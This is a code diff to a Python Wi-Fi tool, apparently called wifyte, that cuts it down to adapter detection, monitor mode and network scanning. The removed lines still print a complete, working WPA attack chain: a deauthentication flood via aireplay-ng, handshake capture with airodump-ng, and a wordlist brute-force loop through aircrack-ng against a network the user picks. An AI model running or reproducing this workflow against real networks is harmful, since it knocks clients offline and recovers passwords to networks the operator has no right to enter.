@@ -3,29 +3,17 @@ import subprocess
 import time
 import sys
 from colorama import Fore, Style, init
-from typing import List, Dict
-from collections import namedtuple
-import logging
 
 # Initialize colorama
 init(autoreset=True)
 
-# Initialize logging
-logging.basicConfig(
-    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
-)
-
 # Configuration
-WORDLIST = os.getenv("WIFYTE_WORDLIST", "wifyte.txt")  # Path to the wordlist file
-TIMEOUT = 180  # Timeout for capturing handshake (3 minutes)
 SCAN_DURATION = 12  # Total scanning duration in seconds
-SCAN_INTERVAL = 4  # Interval between scans in seconds
-
-Network = namedtuple("Network", ["BSSID", "Channel", "SSID", "Signal", "Clients"])
+SCAN_INTERVAL = 3  # Interval between scans in seconds
 
 
 def detect_wifi_adapter() -> str:
-    logging.info("Detecting Wi-Fi adapter...")
+    print(Fore.CYAN + "[+] Detecting Wi-Fi adapter...")
     try:
         result = subprocess.run(
             ["iwconfig"], capture_output=True, text=True, timeout=10
@@ -36,45 +24,53 @@ def detect_wifi_adapter() -> str:
             if "IEEE 802.11" in line
         ]
         if not adapters:
-            logging.error("No Wi-Fi adapter found that supports monitor mode.")
+            print(Fore.RED + "[-] No Wi-Fi adapter found that supports monitor mode.")
             sys.exit(1)
-        logging.info(f"Supported Wi-Fi adapters: {', '.join(adapters)}")
+        print(Fore.GREEN + f"[+] Supported Wi-Fi adapters: {', '.join(adapters)}")
         return adapters[0]  # Select the first adapter
     except subprocess.TimeoutExpired:
-        logging.error("Command timed out.")
+        print(Fore.RED + "[-] Command timed out.")
         sys.exit(1)
     except Exception as e:
-        logging.error(f"Failed to detect Wi-Fi adapter: {e}")
+        print(Fore.RED + f"[-] Failed to detect Wi-Fi adapter: {e}")
         sys.exit(1)
 
 
 def enable_monitor_mode(interface: str) -> str:
-    logging.info(f"Enabling monitor mode on {interface}...")
+    print(Fore.CYAN + f"[+] Enabling monitor mode on {interface}...")
     try:
         subprocess.run(["airmon-ng", "check", "kill"], check=True)
         subprocess.run(["airmon-ng", "start", interface], check=True)
         return f"{interface}mon"
     except subprocess.CalledProcessError as e:
-        logging.error(f"Failed to enable monitor mode: {e}")
+        print(Fore.RED + f"[-] Failed to enable monitor mode: {e}")
         sys.exit(1)
 
 
-def scan_networks(interface: str) -> List[Network]:
+def scan_networks(interface: str):
     networks = []
-    logging.info("Scanning for available Wi-Fi networks... This will take 12 seconds.")
+    print(
+        Fore.CYAN
+        + "[+] Scanning for available Wi-Fi networks... This will take 12 seconds."
+    )
 
+    # Perform scanning in intervals
     start_time = time.time()
     while time.time() - start_time < SCAN_DURATION:
         try:
+            # Run airodump-ng to scan networks
             process = subprocess.Popen(
                 ["airodump-ng", interface],
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
                 text=True,
             )
+
+            # Allow time for scanning
             time.sleep(SCAN_INTERVAL)
             process.terminate()
 
+            # Parse the output of airodump-ng
             output = process.stdout.read()
             lines = output.split("\n")
             temp_networks = []
@@ -86,6 +82,7 @@ def scan_networks(interface: str) -> List[Network]:
 
             for line in lines:
                 if "BSSID" in line:
+                    # Find column indices
                     headers = line.split()
                     try:
                         bssid_index = headers.index("BSSID")
@@ -115,151 +112,61 @@ def scan_networks(interface: str) -> List[Network]:
                         if clients_index and len(parts) > clients_index
                         else "0"
                     )
-                    temp_networks.append(Network(bssid, channel, ssid, signal, clients))
+                    temp_networks.append(
+                        {
+                            "BSSID": bssid,
+                            "Channel": channel,
+                            "SSID": ssid,
+                            "Signal": signal,
+                            "Clients": clients,
+                        }
+                    )
             networks.clear()
             networks.extend(temp_networks)
 
+            # Clear the screen and display the updated list
+            os.system("clear" if os.name != "nt" else "cls")
+            print(Fore.CYAN + "[+] Available Wi-Fi networks:")
+            if not networks:
+                print(Fore.YELLOW + "[-] No networks detected yet. Please wait...")
+            else:
+                for i, network in enumerate(networks):
+                    signal_strength = abs(network["Signal"])
+                    if signal_strength <= 50:
+                        color = Fore.GREEN  # Strong signal
+                    elif 50 < signal_strength <= 70:
+                        color = Fore.YELLOW  # Moderate signal
+                    else:
+                        color = Fore.RED  # Weak signal
+                    print(
+                        f"{i + 1}. {color}SSID: {network['SSID']}, BSSID: {network['BSSID']}, Channel: {network['Channel']}, Signal: {network['Signal']} dBm, Clients: {network['Clients']}"
+                    )
+
         except Exception as e:
-            logging.error(f"Failed to scan networks: {e}")
+            print(Fore.RED + f"[-] Failed to scan networks: {e}")
 
-    logging.info("Available Wi-Fi networks:")
-    if not networks:
-        logging.warning("No networks detected. Please try again.")
-        sys.exit(1)
-
-    for i, network in enumerate(networks):
-        signal_strength = abs(network.Signal)
-        if signal_strength <= 50:
-            color = Fore.GREEN  # Strong signal
-        elif 50 < signal_strength <= 70:
-            color = Fore.YELLOW  # Moderate signal
-        else:
-            color = Fore.RED  # Weak signal
-        print(
-            f"{i + 1}. {color}SSID: {network.SSID}, BSSID: {network.BSSID}, Channel: {network.Channel}, Signal: {network.Signal} dBm, Clients: {network.Clients}"
-        )
-
+    print(Fore.CYAN + "[+] Scanning complete!")
     return networks
 
 
-def deauth_attack(interface: str, bssid: str, channel: str):
-    logging.info(f"Performing deauthentication attack on BSSID: {bssid}...")
-    try:
-        subprocess.run(
-            ["aireplay-ng", "--deauth", "10", "-a", bssid, interface],
-            check=True,
-        )
-    except subprocess.CalledProcessError as e:
-        logging.error(f"Failed to perform deauthentication attack: {e}")
-
-
-def capture_handshake(interface: str, bssid: str, channel: str) -> str:
-    logging.info(f"Attempting to capture handshake from BSSID: {bssid}...")
-    cap_file = "handshake.cap"
-    start_time = time.time()
-
-    while time.time() - start_time < TIMEOUT:
-        process = subprocess.Popen(
-            [
-                "airodump-ng",
-                "--bssid",
-                bssid,
-                "--channel",
-                channel,
-                "--write",
-                "handshake",
-                interface,
-            ]
-        )
-        time.sleep(10)
-        process.terminate()
-
-        if os.path.exists(cap_file):
-            logging.info("Handshake successfully captured!")
-            return cap_file
-
-        deauth_attack(interface, bssid, channel)
-
-    logging.error("Failed to capture handshake after 3 minutes.")
-    return None
-
-
-def crack_handshake(cap_file: str, wordlist: str, target_bssid: str) -> bool:
-    logging.info(f"Starting cracking process using wordlist: {wordlist}...")
-    try:
-        with open(wordlist, "r", encoding="latin-1") as f:
-            passwords = f.readlines()
-
-        total_passwords = len(passwords)
-        logging.info(f"Total passwords to test: {total_passwords}")
-
-        for i, password in enumerate(passwords, start=1):
-            password = password.strip()
-            result = subprocess.run(
-                [
-                    "aircrack-ng",
-                    "-w",
-                    "-",  # Read password from stdin
-                    "-b",
-                    target_bssid,  # Use the selected BSSID
-                    cap_file,
-                ],
-                input=password.encode(),
-                capture_output=True,
-                text=True,
-            )
-
-            if "KEY FOUND!" in result.stdout:
-                logging.info(f"Password successfully cracked: {password}")
-                return True
-
-        logging.warning("Password not found.")
-        return False
-    except Exception as e:
-        logging.error(f"Failed to crack handshake: {e}")
-        return False
-
-
-def disable_monitor_mode(interface: str):
-    logging.info(f"Disabling monitor mode on {interface}...")
-    try:
-        subprocess.run(["airmon-ng", "stop", interface], check=True)
-    except subprocess.CalledProcessError as e:
-        logging.error(f"Failed to disable monitor mode: {e}")
-
-
 def main():
+    # Step 1: Detect Wi-Fi adapter
     adapter = detect_wifi_adapter()
+
+    # Step 2: Enable monitor mode
     monitor_interface = enable_monitor_mode(adapter)
 
     try:
-        networks = scan_networks(monitor_interface)
-
-        choice = int(input("Enter the number of the network you want to test: ")) - 1
-        if choice < 0 or choice >= len(networks):
-            logging.error("Invalid selection.")
-            sys.exit(1)
-
-        target = networks[choice]
-        TARGET_BSSID = target.BSSID
-        logging.info(
-            f"Target selected: SSID: {target.SSID}, BSSID: {TARGET_BSSID}, Channel: {target.Channel}"
-        )
-
-        cap_file = capture_handshake(monitor_interface, TARGET_BSSID, target.Channel)
-        if not cap_file:
-            logging.error("Test failed. No handshake captured.")
-            sys.exit(1)
-
-        success = crack_handshake(cap_file, WORDLIST, TARGET_BSSID)
-        if not success:
-            logging.error("Cracking failed. Password not found.")
-
+        # Step 3: Scan for Wi-Fi networks
+        scan_networks(monitor_interface)
     finally:
-        choice = input("Do you want to disable monitor mode? (y/n): ").lower()
+        # Step 4: Disable monitor mode
+        choice = input(
+            Fore.CYAN + "[+] Do you want to disable monitor mode? (y/n): "
+        ).lower()
         if choice == "y":
-            disable_monitor_mode(monitor_interface)
-        logging.info("Program finished.")
+            subprocess.run(["airmon-ng", "stop", monitor_interface], check=True)
+        print(Fore.CYAN + "[+] Program finished.")
 
 
 if __name__ == "__main__":
